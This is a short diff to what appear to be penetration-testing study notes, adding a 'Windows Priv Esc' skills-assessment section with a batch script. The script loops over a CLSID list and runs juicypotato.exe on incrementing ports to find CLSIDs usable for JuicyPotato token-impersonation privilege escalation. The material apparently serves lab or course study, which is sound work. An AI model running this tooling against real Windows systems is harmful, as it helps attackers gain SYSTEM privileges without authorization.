@@ -238,3 +238,22 @@ Accept-Encoding: gzip, deflate, br
 Accept-Language: en-US,en;q=0.9
 Connection: close
 ```
+---
+### Windows Priv Esc:
+---
+#### Skills Assessment :
+
+```
+@echo off
+:: Starting port, you can change it
+set /a port=10000
+SETLOCAL ENABLEDELAYEDEXPANSION
+
+FOR /F %%i IN (CLSID.list) DO (
+   echo %%i !port!
+   juicypotato.exe -z -l !port! -c %%i >> result.log
+   set RET=!ERRORLEVEL!
+   :: echo !RET!
+   if "!RET!" == "1"  set /a port=port+1
+)
+```
